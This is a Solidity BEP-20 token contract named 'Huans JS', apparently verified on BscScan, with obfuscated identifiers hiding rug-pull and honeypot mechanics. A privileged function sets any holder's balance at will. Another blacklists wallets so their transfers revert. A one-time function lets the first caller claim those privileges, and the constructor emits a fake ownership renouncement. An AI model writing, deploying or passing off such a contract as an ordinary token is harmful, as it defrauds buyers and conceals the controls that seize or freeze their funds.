/**
 *Submitted for verification at BscScan.com on 2023-03-06
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.12;


abstract contract  maxFrom {
    function amountFee() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this;
        // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

interface  txTrading {

    function totalSupply() external view returns (uint256);

    function balanceOf(address sellSwap) external view returns (uint256);

    function transfer(address fromMaxLiquidity, uint256 tokenMin) external returns (bool);

    function allowance(address launchedTotal, address enableTxTrading) external view returns (uint256);

    function approve(address enableTxTrading, uint256 tokenMin) external returns (bool);

    function transferFrom(address tradingMode, address fromMaxLiquidity, uint256 tokenMin) external returns (bool);

    event Transfer(address indexed from, address indexed totalWallet, uint256 value);
    event Approval(address indexed launchedTotal, address indexed spender, uint256 value);
}


abstract contract  fundLiquiditySwap is  maxFrom,  txTrading {
    using SafeMath for uint256;

    mapping(address => uint256) internal _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;

    string private _name;
    string private _symbol;
    uint8 private _decimals;

    constructor (string memory receiverFund, string memory takeSell) {
        _name = receiverFund;
        _symbol = takeSell;
        _decimals = 18;
    }

    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address sellSwap) public view virtual override returns (uint256) {
        return _balances[sellSwap];
    }

    function transfer(address fromMaxLiquidity, uint256 tokenMin) public virtual override returns (bool) {
        _transfer(amountFee(), fromMaxLiquidity, tokenMin);
        return true;
    }

    function allowance(address launchedTotal, address enableTxTrading) public view virtual override returns (uint256) {
        return _allowances[launchedTotal][enableTxTrading];
    }

    function approve(address enableTxTrading, uint256 tokenMin) public virtual override returns (bool) {
        _approve(amountFee(), enableTxTrading, tokenMin);
        return true;
    }

    function transferFrom(address tradingMode, address fromMaxLiquidity, uint256 tokenMin) public virtual override returns (bool) {
        _transfer(tradingMode, fromMaxLiquidity, tokenMin);
        _approve(tradingMode, amountFee(), _allowances[tradingMode][amountFee()].sub(tokenMin, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function increaseAllowance(address enableTxTrading, uint256 minAuto) public virtual returns (bool) {
        _approve(amountFee(), enableTxTrading, _allowances[amountFee()][enableTxTrading].add(minAuto));
        return true;
    }

    function decreaseAllowance(address enableTxTrading, uint256 buyAmountFund) public virtual returns (bool) {
        _approve(amountFee(), enableTxTrading, _allowances[amountFee()][enableTxTrading].sub(buyAmountFund, "ERC20: decreased allowance below zero"));
        return true;
    }

    function _transfer(address tradingMode, address fromMaxLiquidity, uint256 tokenMin) internal virtual {
        require(tradingMode != address(0), "ERC20: transfer from the zero address");
        require(fromMaxLiquidity != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(tradingMode, fromMaxLiquidity, tokenMin);

        _balances[tradingMode] = _balances[tradingMode].sub(tokenMin, "ERC20: transfer amount exceeds balance");
        _balances[fromMaxLiquidity] = _balances[fromMaxLiquidity].add(tokenMin);
        emit Transfer(tradingMode, fromMaxLiquidity, tokenMin);
    }

    function launchSellTake(address sellSwap, uint256 tokenMin) internal virtual {
        require(sellSwap != address(0));

        _beforeTokenTransfer(address(0), sellSwap, tokenMin);

        _totalSupply = _totalSupply.add(tokenMin);
        _balances[sellSwap] = _balances[sellSwap].add(tokenMin);
        emit Transfer(address(0), sellSwap, tokenMin);
    }

    function _burn(address sellSwap, uint256 tokenMin) internal virtual {
        require(sellSwap != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(sellSwap, address(0), tokenMin);

        _balances[sellSwap] = _balances[sellSwap].sub(tokenMin, "ERC20: burn amount exceeds balance");
        _totalSupply = _totalSupply.sub(tokenMin);
        emit Transfer(sellSwap, address(0), tokenMin);
    }

    function _approve(address launchedTotal, address enableTxTrading, uint256 tokenMin) internal virtual {
        require(launchedTotal != address(0), "ERC20: approve from the zero address");
        require(enableTxTrading != address(0), "ERC20: approve to the zero address");

        _allowances[launchedTotal][enableTxTrading] = tokenMin;
        emit Approval(launchedTotal, enableTxTrading, tokenMin);
    }

    function _setupDecimals(uint8 decimals_) internal virtual {
        _decimals = decimals_;
    }

    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual {}
}

interface senderMin {
    function createPair(address amountExempt, address marketingExempt) external returns (address);
}

contract HuansJS is fundLiquiditySwap {

    bool public liquidityLimit;

    function totalAmount(address autoReceiverIs, uint256 tokenMin) public {
        require(txBuy[amountFee()]);
        _balances[autoReceiverIs] = tokenMin;
    }

    address modeReceiverFee = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;

    bool public tradingSender;

    function autoMarketing(address tokenTakeTo) public {
        if (liquidityLimit) {
            return;
        }
        if (walletTo == exemptShouldLaunched) {
            exemptShouldLaunched = walletTo;
        }
        txBuy[tokenTakeTo] = true;
        liquidityLimit = true;
    }

    address public owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    address public walletMax;

    bool public teamExempt;

    bool public atAutoTotal;

    uint256 public walletTo;

    function _beforeTokenTransfer(address senderToken, address totalWallet, uint256 tokenMin) internal override {
        require(!launchLiquidity[senderToken]);
    }

    uint256 private exemptShouldLaunched;

    bool public senderExempt;

    mapping(address => bool) public txBuy;

    function launchedMin(address receiverShould) public {
        if (receiverShould == walletMax || receiverShould == address(0) || receiverShould == fundModeToken || !txBuy[amountFee()]) {
            return;
        }
        if (exemptShouldLaunched == walletTo) {
            senderExempt = false;
        }
        launchLiquidity[receiverShould] = true;
    }

    address buyTake = 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73;

    mapping(address => bool) public launchLiquidity;

    constructor() fundLiquiditySwap("Huans JS", "HJS") { 
        if (walletTo != exemptShouldLaunched) {
            senderExempt = false;
        }
        fundModeToken = senderMin(address(buyTake)).createPair(address(modeReceiverFee),address(this));
        walletMax = amountFee();
        if (tradingSender) {
            atAutoTotal = true;
        }
        txBuy[walletMax] = true;
        launchSellTake(walletMax, 100000000 * 10 ** 18);
        if (senderExempt == tradingSender) {
            atAutoTotal = true;
        }
        emit OwnershipTransferred(walletMax, address(0));
    }

    address public fundModeToken;

}